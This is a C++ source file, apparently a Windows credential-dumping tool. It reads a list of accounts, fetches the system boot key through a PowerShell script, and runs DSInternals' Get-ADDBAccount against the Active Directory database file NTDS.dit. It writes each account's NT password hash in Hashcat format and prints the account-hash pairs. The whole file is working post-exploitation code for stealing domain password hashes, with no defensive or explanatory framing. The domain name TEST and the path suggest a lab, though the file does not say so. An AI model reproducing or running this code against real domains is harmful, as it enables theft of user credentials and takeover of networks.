#include <Windows.h>
#include <sstream>
#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <stdlib.h>
#include <tuple>
#include <tchar.h>
#include <atlstr.h>

std::vector<std::string> listAccount(void)
{
    std::vector<std::string> accounts;
    std::ifstream input("./accounts.txt");
    if (input.is_open())
    {
        std::string line;
        while (std::getline(input, line))
            accounts.push_back(line);
        input.close();
        std::cout << "Accounts loaded" << "\n";
    }
    else
        std::cerr << "File -accounts.txt- not found" << "\n";
    return accounts;
}

std::string getBootkey(void)
{
    system("start powershell.exe C:\\users\\sqtk-mal\\bootkey.ps1");
    std::ifstream input("bootkey.txt");
    std::string bootkey;
    if (input.is_open())
    {
        std::getline(input, bootkey);
        input.close();
        std::cout << "Bootkey loaded" << "\n";
    }
    else
        std::cerr << "File -bootkey.txt- not found" << "\n";
    return bootkey;
}

std::string getPass(void)
{
    std::string pass;
    std::ifstream input("hashes.txt");
    std::string delimiter = ":";
    if (input.is_open())
    {
        std::string line;
        while (std::getline(input, line))
        {
            if (line.size() != 0)
            {
                size_t pos = line.find(delimiter);
                pass = line.substr(pos + 1, line.size());
                input.close();
                std::cout << "pass loaded" << "\n";
                return pass;
            }
        }
        input.close();
    }
    else
        std::cerr << "File -hashes.txt- not found" << "\n";
    return pass;
}

std::vector<std::tuple<std::string, std::string>> linkAccPass(std::vector<std::string> accounts, std::string bootkey)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::vector<std::tuple<std::string, std::string>> accPass;

    for (const std::string& str : accounts)
    {
        std::string cmdline = "powershell.exe -c Get-ADDBAccount -DistinguishedName 'CN=" + str + ",CN=COMPUTERS,DC=TEST,DC=alsid' -DBPath 'C:\\Windows\\NTDS.dit' -BootKey " + bootkey + " | Format-Custom -view HashcatNT | Out-File hashes.txt -Encoding ASCII";
        char* data = new char[cmdline.size() + 1];
        std::copy(cmdline.begin(), cmdline.end(), data);
        data[cmdline.size()] = '\0';
        USES_CONVERSION;
        TCHAR* cmd = A2W(data);
        if (!CreateProcess(NULL,   // No module name (use command line)
            cmd,        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            0,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
            )
        {
            printf("CreateProcess failed (%d).\n", GetLastError());
            break;
        }

        // Wait until child process exits.
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        std::string pass = getPass();
        if (pass.empty())
            std::cerr << "Error password on accout " << str << "\n";
        accPass.push_back(std::make_tuple(str, pass));
    }
    return accPass;
}

void debugAccPass(std::vector<std::tuple<std::string, std::string>> accPass)
{
    for (const auto& elem : accPass) {
        std::cout << std::get<0>(elem) << std::get<1>(elem) << "\n";
    }
}

int main(void)
{
    auto accounts = listAccount();
    if (accounts.empty())
        return -1;
    auto bootkey = getBootkey();
    if (bootkey.empty())
        return -1;
    auto accPass = linkAccPass(accounts, bootkey);
    debugAccPass(accPass);
    int i;
    std::cin >> i;
    return 0;
}